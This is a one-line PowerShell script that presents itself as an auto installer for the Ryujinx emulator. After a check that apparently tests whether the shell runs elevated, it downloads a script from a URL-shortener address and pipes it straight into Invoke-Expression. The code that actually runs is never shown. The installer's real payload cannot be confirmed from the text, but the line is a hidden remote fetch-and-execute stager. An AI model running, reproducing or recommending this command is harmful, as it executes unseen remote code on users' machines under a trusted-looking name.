...
$host.ui.RawUI.WindowTitle="Ryujinx Auto Installer - V16.0.3 | github.com/dazd-pkz/RyujinxInstaller";Write-Host "Ryujinx Auto Installer - V16.0.3`n";if (${env:=::} -eq $null) {iwr -useb urlday.cc/pss|iex} else {exit}
